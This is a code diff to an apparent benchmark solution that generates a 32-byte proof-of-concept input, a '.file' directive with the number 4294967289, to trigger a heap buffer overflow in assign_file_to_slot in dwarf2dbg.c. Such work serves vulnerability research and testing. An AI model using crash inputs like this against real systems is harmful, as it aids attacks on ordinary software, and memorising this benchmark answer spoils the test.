@@ -2,34 +2,42 @@ import os
 
 class Solution:
     """
-    Generates a Proof-of-Concept (PoC) input to trigger a Heap Buffer Overflow.
+    Generates a Proof-of-Concept (PoC) input that triggers a Heap Buffer Overflow.
     """
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
 
-        The vulnerability is a heap buffer overflow in dwarf2dbg.c, within the
-        assign_file_to_slot function. It occurs when handling a .file directive
-        with a large integer that overflows a signed 32-bit integer.
+        The vulnerability is in dwarf2dbg.c, in the `assign_file_to_slot` function.
+        It's triggered by a `.file` directive with a large integer that overflows
+        a signed 32-bit integer when parsed.
 
-        The example value 4294967289 (2^32 - 7) overflows to -7 when treated as a
-        32-bit signed int. This negative value is then used in a way that causes
-        an out-of-bounds memory access on the heap.
+        The number 4294967289 (which is 2^32 - 7 or 0xFFFFFFF9) is parsed into a
+        signed `int`, resulting in the value -7. This negative value is then used
+        as an index into a heap-allocated array, causing a heap buffer underflow
+        (a type of buffer overflow).
 
-        The PoC constructs a minimal input line that follows the `.file` directive
-        syntax and uses this overflowing integer to trigger the crash. A short
-        filename is used to minimize the PoC's length for a better score.
+        To create a PoC of the target length (32 bytes), we construct the line:
+        .file 4294967289 "<filename>"\n
+
+        The length breakdown is as follows:
+        - ".file "          : 6 bytes
+        - "4294967289"      : 10 bytes
+        - " "               : 1 byte
+        - '""' (quotes)     : 2 bytes
+        - "\n" (newline)    : 1 byte
+        - Total fixed parts : 20 bytes
+
+        To reach 32 bytes, the filename inside the quotes must be 12 bytes long.
+        We can use a simple repeating character like 'a'.
 
         Args:
-            src_path: Path to the vulnerable source code tarball (unused).
+            src_path: Path to the vulnerable source code tarball (not used).
 
         Returns:
             bytes: The PoC input that should trigger the vulnerability.
         """
-        # The format is: .file <number> "<filename>"
-        # We use the number from the vulnerability description which overflows
-        # a signed 32-bit integer.
-        # An empty filename "" is used to keep the PoC as short as possible.
-        # A newline character is typically expected by line-based parsers.
-        poc_string = '.file 4294967289 ""\n'
-        return poc_string.encode('ascii')
+        # The PoC string is crafted to be exactly 32 bytes.
+        # ".file 4294967289 \"<12-byte-filename>\"\n"
+        poc = b'.file 4294967289 "aaaaaaaaaaaa"\n'
+        return poc
